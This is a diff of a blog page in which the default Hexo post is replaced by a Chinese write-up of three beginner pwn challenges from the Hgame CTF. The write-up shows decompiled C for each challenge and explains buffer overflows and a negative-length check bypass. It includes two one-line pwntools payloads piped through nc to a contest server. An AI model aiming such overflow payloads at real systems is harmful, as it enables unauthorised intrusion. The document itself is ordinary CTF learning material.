@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
     <title>
         
-        Hello World · kir[A]&#39;s 小黑屋
+        Hgame pwn · kir[A]&#39;s 小黑屋
         
     </title>
     <link rel="icon" href= /assets/favicon.ico>
@@ -72,7 +72,7 @@
                 <a href="/" >kir[A]&#39;s 小黑屋.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Hello World</a>
+                <a href="#" class="post-name">Hgame pwn</a>
             </div>
     </div>
     
@@ -93,7 +93,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Hello World
+            Hgame pwn
             <!-- 404 -->
             
         </h1>
@@ -112,7 +112,7 @@
             <script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdMiniList": false, "bdPic": "", "bdStyle": "1", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = "/static/api/js/share.js"];</script>
             <div class="post-intro-meta">
                 <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                <span class="post-intro-time">2018/01/16</span>
+                <span class="post-intro-time">2018/02/07</span>
                 <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                     <span class="iconfont-archer">&#xe604;</span>
                     <span id="busuanzi_value_page_pv"></span>
@@ -195,27 +195,27 @@
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+        <p>Hgame几题简单的pwn，不太难，有点意思，简单写写。</p>
+<h3 id="guess-number"><a href="#guess-number" class="headerlink" title="guess_number"></a>guess_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"enter your guess:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;nptr);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"OHHHHHHH! u did it !\norz orz orz orz\nhere is your flag:"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>虽然开了canary，但是只要输入的东西覆盖到随机数，判断一样就cat flag了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ distance  0xffffd39c 0xffffd4b0</span><br><span class="line">From 0xffffd39c to 0xffffd4b0: 276 bytes, 69 dwords</span><br></pre></td></tr></table></figure></p>
+<p>计算一下输入位置和随机数的距离，输入一堆’1’<em>276，atoi会将输入转成0x7fffffff。那么payload：`python -c “from pwn import </em>;print ‘1’*276+p32(0x7fffffff)” |nc 111.230.149.72 10002`</p>
+<h3 id="flag-server"><a href="#flag-server" class="headerlink" title="flag_server"></a>flag_server</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"your username length: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">while</span> ( v5 &gt; <span class="number">63</span> || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"sorry,your username is too LOOOOOOOOONG~~\nplease input again.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your username length: "</span>);</span><br><span class="line">    <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">      ;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"whats your username?"</span>);</span><br><span class="line">  read_n(&amp;s1, v5);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"admin"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = time(<span class="number">0</span>);</span><br><span class="line">    srand(v3);</span><br><span class="line">    v8 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello admin, please input the key: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%u"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 != v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"noooo, you are not the TRUE admin!!!\nwho are you???"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello %s, here is what I want to tell you:"</span>, &amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_8048BF4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<p>虽然限制了username长度，可以输入负数直接绕过，然后输入一大堆’1’，将v10覆盖了就OK。</p>
+<h3 id="zazahui"><a href="#zazahui" class="headerlink" title="zazahui"></a>zazahui</h3><p>神经病题目~<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v0 = fopen(<span class="string">"ad"</span>, <span class="string">"r"</span>);</span><br><span class="line">v1 = fopen(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">__isoc99_fscanf(v0, <span class="string">"%s"</span>, &amp;ad);</span><br><span class="line"><span class="keyword">return</span> __isoc99_fscanf(v1, <span class="string">"%s"</span>, &amp;flag);</span><br></pre></td></tr></table></figure></p>
+<p>广告词和flag都读到bss段了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">s = (<span class="keyword">char</span> *)&amp;ad;</span><br><span class="line">v3 = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format, v3);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  getinput((<span class="keyword">int</span>)&amp;s1, <span class="number">188</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"fuck it"</span>) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"me too! again!!!\n"</span>);</span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"that's not right :(\n"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p>只要将s覆盖成flag的地址就可以，不用计算距离，直接干！payload：<code>python -c &quot;from pwn import *;print 100*p32(0x0804A060)&quot; |nc 111.230.149.72 10003</code></p>
 
     </article>
     <!-- 前后页  -->
     <ul class="post-pager">
         
-            <li class="next">
-                <a href= "/2018/01/30/pwn-imdb/" title= pwn-imdb >
-                    <span>Next Post</span>
-                    <span>pwn-imdb</span>
+        
+            <li class="previous">
+                <a href= "/2018/02/05/HITCTF2018-writeup/" title= HITCTF2018-writeup >
+                    <span>Previous Post</span>
+                    <span>HITCTF2018-writeup</span>
                 </a>
             </li>
-        
         
     </ul>
     <!-- 评论插件 -->
@@ -283,7 +283,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-number">1.</span> <span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-number">1.1.</span> <span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-number">1.2.</span> <span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-number">1.3.</span> <span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-number">1.4.</span> <span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#guess-number"><span class="toc-number">1.</span> <span class="toc-text">guess_number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-server"><span class="toc-number">2.</span> <span class="toc-text">flag_server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zazahui"><span class="toc-number">3.</span> <span class="toc-text">zazahui</span></a></li></ol>
     </div>
     
     <div class="back-top">&#xe639;</div>
